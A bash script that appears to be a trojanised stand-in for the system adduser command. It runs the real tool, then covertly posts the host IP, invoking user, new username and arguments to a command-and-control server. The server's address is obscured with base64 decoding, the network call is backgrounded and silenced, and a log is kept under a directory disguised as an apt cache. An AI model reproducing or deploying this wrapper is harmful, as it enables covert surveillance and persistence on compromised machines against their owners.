#!/bin/bash

REAL_ADDUSER="/usr/sbin/adduser"
LOG_DIR="/var/lib/apt/lists/.cache"
LOCAL_LOG="${LOG_DIR}/events"
C2_HOST=$(printf "%s" "__ENC__" | base64 -d)
C2_PORT="9001"
COLLECT_URL="http://${C2_HOST}:${C2_PORT}/log"

_log_local() {
    touch "$LOCAL_LOG" 2>/dev/null
    echo "$1" >> "$LOCAL_LOG" 2>/dev/null
    true
}

_log_remote() {
    curl -sf -X POST -H "Content-Type: application/json" \
        -d "$1" --connect-timeout 3 --max-time 3 \
        "$COLLECT_URL" > /dev/null 2>&1 &
    true
}

INVOKING_USER=$(whoami)
HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
HOST_TS=$(date -u "+%Y-%m-%dT%H:%M:%SZ")
COMMAND_ARGS="$*"

NEW_USER=""
for arg in "$@"; do
    case "$arg" in
        --*) ;;
        *) NEW_USER="$arg" ;;
    esac
done

$REAL_ADDUSER "$@"
RC=$?

if [ $RC -eq 0 ] && [ -n "$NEW_USER" ]; then
    PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"useradd","timestamp":"%s","data":{"new_user":"%s","args":"%s","via":"adduser"}}' \
        "$HOST_IP" "$INVOKING_USER" "$HOST_TS" "$NEW_USER" "$COMMAND_ARGS")
    _log_remote "$PAYLOAD"
    _log_local "${HOST_TS}|useradd|${INVOKING_USER}|new_user:${NEW_USER}|via:adduser|${COMMAND_ARGS}"
fi

exit $RC
